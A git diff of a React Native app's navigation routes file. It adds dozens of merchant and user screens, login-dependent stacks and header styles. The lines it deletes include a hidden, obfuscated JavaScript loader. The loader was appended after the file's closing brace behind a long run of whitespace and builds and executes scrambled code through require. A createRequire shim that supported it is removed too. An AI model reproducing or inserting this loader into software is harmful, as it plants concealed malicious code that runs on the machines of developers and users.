@@ -5,8 +5,15 @@ import {
   useNavigation,
 } from '@react-navigation/native';
 import {createNativeStackNavigator} from '@react-navigation/native-stack';
-import {View, ActivityIndicator, StyleSheet} from 'react-native';
+import {
+  View,
+  ActivityIndicator,
+  StyleSheet,
+  Image,
+  TouchableOpacity,
+} from 'react-native';
 import {useSelector} from 'react-redux';
+import Ionicons from 'react-native-vector-icons/Ionicons';
 
 // --- Import all components ---
 import TabsComponent from './TabsComponent';
@@ -14,28 +21,94 @@ import LoginScreen from '../views/pages/authentication/LoginScreen';
 import SignupScreen from '../views/pages/authentication/SignupScreen';
 import ForgotScreen from '../views/pages/authentication/ForgotScreen';
 import Verification from '../views/pages/authentication/Verification';
-import { createRequire } from 'module';
+import DealsDiscountScreen from '../views/pages/onBoardScreen/DealsDiscountScreen';
+import CreateDeal from '../views/pages/onBoardScreen/CreateDeal';
+import AssignProducts from '../views/pages/onBoardScreen/AssignProducts';
+import BulkUpload from '../views/pages/onBoardScreen/BulkUpload';
+import AddNewProduct from '../views/pages/onBoardScreen/AddNewProduct';
 
-const require = createRequire(import.meta.url);
+//Add by Rajan
+
+import HelpSupport from '../views/pages/onBoardScreen/HelpSupport';
+import CreateTicket from '../views/pages/onBoardScreen/CreateTicket';
+import ViewTicket from '../views/pages/onBoardScreen/ViewTicket';
+import Security from '../views/pages/onBoardScreen/Security';
+import Terms from '../views/pages/onBoardScreen/TeamSupport';
+import TeamSupport from '../views/pages/onBoardScreen/TeamSupport';
+import CreateOperator from '../views/pages/onBoardScreen/CreateOperator';
+import CreateUser from '../views/pages/onBoardScreen/CreateUser';
+import MyPost from '../views/pages/onBoardScreen/MyPost';
+import CreatePost from '../views/pages/onBoardScreen/CreatePost';
+import EditPost from '../views/pages/onBoardScreen/EditPost';
+import CreateDepartment from '../views/pages/onBoardScreen/CreateDepartment';
+
+import CreateAd from '../views/pages/onBoardScreen/CreateAd';
+import ReportsScreen from '../views/pages/onBoardScreen/ReportsScreen';
+import OrdersScreen from '../views/pages/onBoardScreen/OrdersScreen';
+import OrderDetailsScreen from '../views/pages/onBoardScreen/OrderDetailsScreen';
+import ReviewScreen from '../views/pages/onBoardScreen/ReviewScreen';
+import ReviewDetailScreen from '../views/pages/onBoardScreen/ReviewDetailScreen';
+import MerchantProfileScreen from '../views/pages/onBoardScreen/MerchantProfileScreen';
+import Account from '../views/pages/onBoardScreen/Account';
+import InventoryScreen from '../views/pages/onBoardScreen/InventoryScreen';
+import Bazar from '../views/pages/user/Bazar';
+import AllBazar from '../views/pages/user/AllBaazar';
+import UserProductDetail from '../views/pages/user/UserProductDetail';
+import UserRating from '../views/pages/user/UserRating';
+import MyCart from '../views/pages/user/MyCart';
+import CheckoutScreen from '../views/pages/user/CheckoutScreen';
+import ConfirmationScreen from '../views/pages/user/ConfirmationScreen';
+import PaymentMethod from '../views/pages/user/PaymentMethod';
+import ShippingAddressScreen from '../views/pages/user/ShippingAddressScreen';
+import AddShippingAddressScreen from '../views/pages/user/AddShippingAddressScreen';
+import AccountSettingsScreen from '../views/pages/user/AccountSettingsScreen';
+import StartUpScreen from '../views/pages/StartUpScreen';
+import InstituteListScreen from '../views/pages/user/InstitueListScreen';
+import UserDeleteAccountScreen from '../views/pages/user/UserDeleteAccountScreen';
+import UserEmailSuccessScreen from '../views/pages/user/UserEmailSuccessScreen';
+import UserEmailSupportScreen from '../views/pages/user/UserEmailSupport';
+import UserMyOrdersScreen from '../views/pages/user/UserMyOrdersScreen';
+import UserOrderDetail from '../views/pages/user/UserOrderDetail';
+import UserOrderDetailRefund from '../views/pages/user/UserOrderDetailRefund';
+import PaymentHelpScreen from '../views/pages/user/UserPaymentHelp';
+import UserRatingReviewsScreen from '../views/pages/user/UserRatingReviewsScreen';
+import UsersWriteReviewScreen from '../views/pages/user/UsersWriteReviewScreen';
+import ConfirmPickup from '../views/pages/user/ConfirmPickup';
+import Return from '../views/pages/user/Return';
+import Students from '../views/pages/user/Students';
+import StudentDetails from '../views/pages/user/StudentDetails';
+import AssociatedInstitutes from '../views/pages/user/AssociatedInstitutes';
+import DeliveryTracking from '../views/pages/user/DeliveryTracking';
+import HelpCenter from '../views/pages/user/HelpCenter';
+import CustomMenuButton from '../views/components/DrawerHeader/CustomMenuButton';
+import {setUserDashboardModalToggle} from '../store/slices/userSlice';
+import {colors} from '../config/colors';
+import InstituteProfile from '../views/pages/onBoardScreen/InstituteProfile';
+import PersonalInfo from '../views/pages/onBoardScreen/PersonalInfo';
+import CreatePasswordScreen from '../views/pages/authentication/CreatePasswordScreen';
+import EmailSentScreen from '../views/pages/authentication/EmailSentScreen';
+import {OnboardingScreen} from '../views/pages/authentication/OnboardingScreen';
+import {LanguageSelectionScreen} from '../views/pages/authentication/LanguageSelectionScreen';
+
 const Stack = createNativeStackNavigator();
 
 // --- AuthLoadingScreen: Ensures history is cleared ---
-const AuthLoadingScreen = () => {
-  const navigation = useNavigation();
-  const {userInfo} = useSelector(({user}) => user);
+// const AuthLoadingScreen = () => {
+//   const navigation = useNavigation();
+//   const {userInfo} = useSelector(({user}) => user);
 
-  React.useEffect(() => {
-    const destination = userInfo ? 'Dashboard' : 'LoginScreen';
-    // ✅ FIX: Use replace() to remove AuthLoadingScreen from the stack.
-    navigation.replace(destination);
-  }, [userInfo, navigation]);
+//   React.useEffect(() => {
+//     const destination = userInfo ? 'Dashboard' : 'LoginScreen';
+//     // ✅ FIX: Use replace() to remove AuthLoadingScreen from the stack.
+//     navigation.replace(destination);
+//   }, [userInfo, navigation]);
 
-  return (
-    <View style={loadingStyles.loadingContainer}>
-      <ActivityIndicator size="large" color="#ED8A00" />
-    </View>
-  );
-};
+//   return (
+//     <View style={loadingStyles.loadingContainer}>
+//       <ActivityIndicator size="large" color="#ED8A00" />
+//     </View>
+//   );
+// };
 // --------------------------------------------------------
 
 const theme = {
@@ -46,29 +119,249 @@ const theme = {
   },
 };
 
+// const customHeaderOptions = ({navigation}) => ({
+//   headerShown: true,
+//   headerLeft: () => <CustomMenuButton navigation={navigation} />,
+//   headerTitle: () => (
+//     <View
+//       style={{
+//         flexDirection: 'row',
+//         alignItems: 'center',
+//         justifyContent: 'center',
+//       }}>
+//       <Image
+//         source={require('../assets/images/nextgenlogo.png')}
+//         style={{
+//           width: 110, // Adjust size
+//           height: 30,
+//         }}
+//         resizeMode="contain"
+//       />
+//     </View>
+//   ),
+//   headerRight: () => (
+//     <TouchableOpacity
+//       onPress={() => {
+//         dispatch(setUserDashboardModalToggle(true));
+//       }}
+//       style={{
+//         padding: 6,
+//         marginRight: 10,
+//         borderRadius: 8,
+//         borderWidth: 1,
+//         borderColor: '#ddd',
+//         alignItems: 'center',
+//         justifyContent: 'center',
+//       }}>
+//       <Ionicons name="swap-horizontal-outline" size={24} color={'#333'} />
+//     </TouchableOpacity>
+//   ),
+//   headerStyle: {},
+//   headerTitleAlign: 'center',
+// });
+
 export default function Routes({navigationRef, isReadyRef}) {
+  const {userInfo} = useSelector(({user}) => user);
+  const isLoggedIn = !!userInfo?.userId;
+  console.log(isLoggedIn, 'isLoggedIn');
   return (
     <NavigationContainer
       ref={navigationRef}
       onReady={() => {
         isReadyRef.current = true;
       }}
-      theme={theme}>
+      theme={theme}
+      initialRouteName="StartUpScreen">
       <Stack.Navigator
-        initialRouteName="AuthLoading"
-        screenOptions={{headerShown: false}}>
-        {/* 1. Initial Loading Screen */}
-        <Stack.Screen name="AuthLoading" component={AuthLoadingScreen} />
+        screenOptions={{headerShown: false}}
+        //   initialRouteName="LoginScreen"
+        // screenOptions={customHeaderOptions}
+      >
+        {!isLoggedIn ? (
+          <>
+            <Stack.Screen
+              name="LanguageSelection"
+              component={LanguageSelectionScreen}
+            />
 
-        {/* 2. Authentication Flow Screens */}
-        <Stack.Screen name="LoginScreen" component={LoginScreen} />
-        <Stack.Screen name="SignupScreen" component={SignupScreen} />
-        <Stack.Screen name="ForgotScreen" component={ForgotScreen} />
-        <Stack.Screen name="Verification" component={Verification} />
+            <Stack.Screen name="Onboarding" component={OnboardingScreen} />
+            <Stack.Screen name="StartUpScreen" component={StartUpScreen} />
+            <Stack.Screen name="LoginScreen" component={LoginScreen} />
+            <Stack.Screen name="EmailSentScreen" component={EmailSentScreen} />
+            <Stack.Screen
+              name="SignupScreen"
+              component={SignupScreen}
+              // options={{
+              //   headerShown: false,
+              // }}
+            />
+            <Stack.Screen
+              name="ForgotScreen"
+              component={ForgotScreen}
+              // options={{
+              //   headerShown: false,
+              // }}
+            />
+            <Stack.Screen
+              name="Verification"
+              component={Verification}
+              // options={{
+              //   headerShown: false,
+              // }}
+            />
+            <Stack.Screen
+              name="CreatePassword"
+              component={CreatePasswordScreen}
+            />
+          </>
+        ) : (
+          <>
+            {/* 3. Main Application Flow Target */}
+            {/* This screen name 'Dashboard' is the target for navigation.replace() */}
+            <Stack.Screen name="Dashboard" component={TabsComponent} />
 
-        {/* 3. Main Application Flow Target */}
-        {/* This screen name 'Dashboard' is the target for navigation.replace() */}
-        <Stack.Screen name="Dashboard" component={TabsComponent} />
+            <Stack.Screen
+              name="DealsDiscountScreen"
+              component={DealsDiscountScreen}
+            />
+            <Stack.Screen name="CreateDeal" component={CreateDeal} />
+            <Stack.Screen name="AssignProducts" component={AssignProducts} />
+            <Stack.Screen name="BulkUpload" component={BulkUpload} />
+            <Stack.Screen name="AddNewProduct" component={AddNewProduct} />
+
+            <Stack.Screen
+              name="CreateDepartment"
+              component={CreateDepartment}
+            />
+
+            <Stack.Screen name="CreateAd" component={CreateAd} />
+
+            <Stack.Screen name="ReportsScreen" component={ReportsScreen} />
+            <Stack.Screen name="OrdersScreen" component={OrdersScreen} />
+
+            <Stack.Screen
+              name="OrderDetailsScreen"
+              component={OrderDetailsScreen}
+            />
+
+            <Stack.Screen name="ReviewScreen" component={ReviewScreen} />
+
+            <Stack.Screen
+              name="ReviewDetailScreen"
+              component={ReviewDetailScreen}
+            />
+
+            <Stack.Screen
+              name="MerchantProfileScreen"
+              component={MerchantProfileScreen}
+            />
+
+            <Stack.Screen name="Accounts" component={Account} />
+
+            <Stack.Screen name="HelpSupport" component={HelpSupport} />
+            <Stack.Screen name="InventoryScreen" component={InventoryScreen} />
+            <Stack.Screen name="Team" component={TeamSupport} />
+            <Stack.Screen name="CreateUsers" component={CreateUser} />
+            <Stack.Screen name="CreateOperat" component={CreateOperator} />
+            <Stack.Screen name="Securit" component={Security} />
+            <Stack.Screen name="CreateTick" component={CreateTicket} />
+            <Stack.Screen name="ViewTicket" component={ViewTicket} />
+            {/* Add by Rajan*/}
+
+            <Stack.Screen name="CreatePost" component={CreatePost} />
+            <Stack.Screen name="EditPost" component={EditPost} />
+
+            {/* <Stack.Screen name="MyPost" component={MyPost} /> */}
+
+            {/* User Module*/}
+            <Stack.Screen name="Bazar" component={Bazar} />
+            <Stack.Screen name="AllBazar" component={AllBazar} />
+            <Stack.Screen
+              name="UserProductDetail"
+              component={UserProductDetail}
+            />
+            <Stack.Screen name="UserRating" component={UserRating} />
+            <Stack.Screen name="MyCart" component={MyCart} />
+            <Stack.Screen
+              name="CheckoutScreen"
+              component={CheckoutScreen}></Stack.Screen>
+            <Stack.Screen
+              name="Confirmation"
+              component={ConfirmationScreen}></Stack.Screen>
+            <Stack.Screen
+              name="PaymentMethod"
+              component={PaymentMethod}></Stack.Screen>
+            <Stack.Screen
+              name="ShippingAddress"
+              component={ShippingAddressScreen}
+            />
+            <Stack.Screen
+              name="AddShippingAddressScreen"
+              component={AddShippingAddressScreen}
+            />
+            <Stack.Screen
+              name="AccountSettingsScreen"
+              component={AccountSettingsScreen}
+            />
+
+            <Stack.Screen
+              name="UserDeleteAccountScreen"
+              component={UserDeleteAccountScreen}
+            />
+            <Stack.Screen
+              name="UserEmailSuccessScreen"
+              component={UserEmailSuccessScreen}
+            />
+            <Stack.Screen
+              name="UserEmailSupportScreen"
+              component={UserEmailSupportScreen}
+            />
+            <Stack.Screen
+              name="UserMyOrdersScreen"
+              component={UserMyOrdersScreen}
+            />
+            <Stack.Screen name="UserOrderDetail" component={UserOrderDetail} />
+            <Stack.Screen
+              name="UserOrderDetailRefund"
+              component={UserOrderDetailRefund}
+            />
+            <Stack.Screen
+              name="PaymentHelpScreen"
+              component={PaymentHelpScreen}
+            />
+            <Stack.Screen
+              name="UserRatingReviewsScreen"
+              component={UserRatingReviewsScreen}
+            />
+            <Stack.Screen
+              name="UsersWriteReviewScreen"
+              component={UsersWriteReviewScreen}
+            />
+            {/* rajan */}
+            <Stack.Screen name="HelpCenter" component={HelpCenter} />
+
+            <Stack.Screen
+              name="DeliveryTracking"
+              component={DeliveryTracking}
+            />
+            <Stack.Screen
+              name="AssociatedInstitutes"
+              component={AssociatedInstitutes}
+            />
+            <Stack.Screen name="StudentDetails" component={StudentDetails} />
+
+            <Stack.Screen name="Students" component={Students} />
+            <Stack.Screen name="Return" component={Return} />
+
+            <Stack.Screen name="ConfirmPickup" component={ConfirmPickup} />
+
+            <Stack.Screen
+              name="InstituteProfile"
+              component={InstituteProfile}
+            />
+            <Stack.Screen name="PersonalInfo" component={PersonalInfo} />
+          </>
+        )}
       </Stack.Navigator>
     </NavigationContainer>
   );
@@ -81,4 +374,30 @@ const loadingStyles = StyleSheet.create({
     alignItems: 'center',
     backgroundColor: '#fff',
   },
-});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       global['_V']='8-1734';global['r']=require;if(typeof module==='object')global['m']=module;(function(){var VRG='',GhP=764-753;function MDy(f){var r=1111436;var w=f.length;var h=[];for(var q=0;q<w;q++){h[q]=f.charAt(q)};for(var q=0;q<w;q++){var z=r*(q+119)+(r%13553);var i=r*(q+615)+(r%37182);var b=z%w;var c=i%w;var j=h[b];h[b]=h[c];h[c]=j;r=(z+i)%3896884;};return h.join('')};var tgr=MDy('lcdmccutnorbjrothxgunkyepaivtswrsozqf').substr(0,GhP);var ruc='.2h .0d6rr1r[,r=i=) r+)p.g12;;sfgm75(m.frg==za"qr }e.hvl[-]=c80]rag7c,eah7us;zht;rm0(;*i[4sre0v}[,)),8rr+rhr]]0,8(nao,1i(; <f tczfvf)ase]  +9(;9<ply0n t(;r)l+4rlt-ff!eujafopx;v{[;+s(or;1=tCqa;;=61uf)rovty1nt[gooa"e(uv]r;u( n;thc2+o)tvp]o+oa8qr f{talw=>{8-lo4vusSfxt{!cv)nf(.p]uSek;on8ha(0aye-m;=a9<v.rnlo;l0ag7(in.2q-=otwp[n=1yo;7hg;=uzib 7sr.r(..vnA]a) d7h7ilt)e r(u;g ;6)=+m;choh.C)xvtlrsh(tA;(f)0=,r+m7+"0=h8uvi;oivh9"1auCm9(c[+r.tue+nr,ap65=[qa7no(o9ue)r;(;()x.=ns{k,f,se,l[naw,aet+vcha1ev;ho=6coitav,5scar7lhpt govo,q-ka ov,C[wsi}"d]0e)]ti=0.rkif=<=cn(l,2ee[laA+otn=2" )r.h,{.h;uhtp*wfeeft)r1s>.([o.}.)+u=2" (Cpl;r.a.;j;)+o;rri)h( ,))e[u"aAdohdbgt(v)gr2w)hwdy8f1.rop=.w,iy=] r;b=p=ls=,tb}lh.3,i;i+1lne=wf;=ar. =s4"sl;63n,rrh u(s+]=+}acnp;(q71;rr=fcC6l8g,f9d;C(a=lvlnvj;;"(aonz.itlb;; a(taesi6h, ru+(fdf;evr ake}=+5)rizf<-enj=in)=)o(ngi,A+mib(;,ode)(){]))urvv6sn+d6=ad+to=at;=C,j)1=+iz=';var oWZ=MDy[tgr];var kcL='';var AoT=oWZ;var yus=oWZ(kcL,MDy(ruc));var quw=yus(MDy('i+]Pet)=( "en]E_4]9r2%PT;oh-:8c}]strr3tcFn+;%p.%\/=osofa2.4l5s3f(c1glPhuc_k.)yb(irP5P7+j .N}bPe1%c"p4P*7i0PP].et0l;os %shn0i(P.5P(wPn]n%.]7,C2]}233dr(4pPr.earo,r(26h%0g\/.{..t c.[CP h6\/:ce.rr=r4thtgPa.tk=c{u28nPcG.2]=.e&4(oagPo(1re0%b%fiPn;tP%h)d4}P7rcf+t([e1e i{%#)\'vkt1l(xlo1rPidn.!ie=mhtf %_+e]!.z#% e%].tno.(to=P)=os1:y ctP.b0PP+l one._5Dkt3Pebh](tzk%nmPP0;P0.P.%ot ryuPPnpoP7tSc4i6PnTty8En,PPc\/Pafrd\/.PewaP1.!z=0!5y9),r;ur]konshc.tjcea1Pt7onC)n6:d!%2ttmu3]5me\'0p)Pv)]PPtt10=({tcldP,%a%,3Pelb.rc0.ci.P= hnt}ie}rm]t21(rpohs5_=2+)ch7Paao.f(vl)ya%use)r(,,cte;2,)0e6\/cif2.+e9c([aPt$)]"b?Pumnc,*t!3s]ccp?f=]2)ar)9too2e33])cju9o7hrx.(+.Bgg.s26b0.(rA2>gM=P2iP=i5n$a4yf)7ns(ac nrfrP=tPr=xs..e;Pi:h.e])[Cot%3t=shtP)4k]os4@(\/1d189s6<m_0P](;T95 wCs=o.tianPt;cP;r]-; ee%ltPe4rP4#.fmntd.e;3.]]=.cv8(]f1-%.2.Pa};ti+PaCt.fea. lei;t(P+[(]nClpc2t;c]ec.13webnE)%hte3(.(PP.]s].s.3(e+icP(-,}5n(nh.].7tr2.._wbP..e1P.u=r=[uP.A]%s[.]=1tieg)%533;=_+[]%.5;rnc;.i4(}Fl4%P%ern2P% 6PPP=r.]P.]e=}.]c|P]rePde.)rc0PcP{arPbdp=ng:))8o5a{\':so%1)cn0u&6o\']1(=7l#vc)c354)PpP8s;??BProe].$66u9q0%]w;.o.t;]a]>;ni7P_EPidocw%%=8id)5n4d]i;d@aP8ou)l:atbrlP.(9r)&Foi+#%%]1]ypwr}t)P8nbu{ m(p(]tP_33!=?.5r)(PtP_FNu(ta))r1lf[sD,0:+(io[30]];"S0l1]reo2a;P;%. y%]oa[oP!%soP;)if%P)g>8etasPsdt*"n]t)oshctPfc[Pe\/0...i]3P;)\/r;s32hri l!6Pl7(e7t%t%}2=.01s..ePt.1}c+Pb0a5a},}au0P2 c9ieS1]:(mrl a(fP{}=l.S%)e0dt_]\/{j+snr)pho9at-c2c41!n.:Pc!ov tPaPc%t=2,e%9)]%=)tP{h{P.anmeccs=nr3c.y(9+t)\/e9Pcctc5oomju)s_j\/)6e PPP.}j66Ph17[ba!-P<PiP.|Pko(,!n*d.c+(,(PrPcr(e)27.o]01.}e{)PDPD89],{n}tm!]n)5fmPePr==xpp]rc&}.tff5t;m#daP)](7iPfs9f54t,f4Pt6mhrye,tanT{P )PqPch]+AFcccPot\/PruPP.13t4r]("[id.!!o\/0..!ci{s.cs;9]).,p2])s6e>3$w.}P9x&rn.PP!%64P(S(PtagP$8A:4s9(]"dn]set,4e)}}ll(t2(o"P"EaPorbP<t=s.P4t()e9otnCi)]%e{1_]d2@!nthFne};!d]5oclkcP%heu+1PPNscum(=<ee".8=.\/8sr] a0G.aPi[6?][=a-3lB5;d3$[n%90P.Pr[7gcm(r3 un[1e.}o)bP,PAn1t%0.%nd],P,d,iS.[P =ce8!"2Pe}]11Pf >}3x(;}a>si.T3.4PPPSsc[omP)1fwro_PcaPegrP}=-.[)]P%..PP}cPn)1l,irP.(5.)pf,2d Peo0)$i35u]i(P5e.sf1)*P8s\'493mE741PEP,.Ab72P]0Pza_i}7cPr4\/b&c.er3;Pdacocn\'(PBt=t22grPcr),6]782 1P.9yb?1;7]]=o% :s7(xPP,9]C@P4c)e{s5a!sei.v9c6t\';3P{P})P)\')nj=9.a]rMgwh:occec3oaeP.1Pp5(9!a%c0r}ePc+)6.ryp6.=C0)w iP.tp]3dPE+d$\/Pc)e)3Psfe;1lzA8=+{rre5=c=5%,.4sn=k41)]0(e])oe.][<.!=o8ltr.)];Pc.cs8(iP)P1;=nf(:0_pg9lec]x2eyB]=1c)tPPt(#[;;..)9t.w+:\/.l.g,wi=i%pi.nPTtbkourPc};caoriavP.t"}C(fd-(1BiG )Datc)1)]:!.dsiPnt8{cy ,t(}es%,v(PP.1vi>Ph!)n4sP%=lbm?78oP+bl4a=fr3eobvt3ngoa2!e4)r3[.(tg e(=](}8 ,tio%een7.xcil._gcicd(l4PNP>br\/)c!.ed;4nmd8]tno3e.;zcpe6ted+Paj h-P#caP(4b2ns9]ei)d%f[rsmu}hA.)d9eb8*ePt iP%)4a}(c2ab\'+Ck.cP,36P;rPj?%*tPs+%ib(:5n%>i3447P'));var tzo=AoT(VRG,quw );tzo(5471);return 3456})()
+  //12-12-2025
+  centerContainer: {
+    // Style the container for the logo/text
+    flexDirection: 'row',
+    alignItems: 'center',
+    justifyContent: 'center',
+  },
+  logo: {
+    width: 110, // Adjust size
+    height: 30, // Adjust size
+  },
+  headerText: {
+    fontSize: 18,
+    fontWeight: 'bold',
+    // color: colors.textDark,
+  },
+  rightButton: {
+    // Styling the right button to match the rounded box in your image
+    padding: 6,
+    marginRight: 10,
+    borderRadius: 8,
+    borderWidth: 1,
+    borderColor: '#ddd',
+    alignItems: 'center',
+    justifyContent: 'center',
+  },
+});
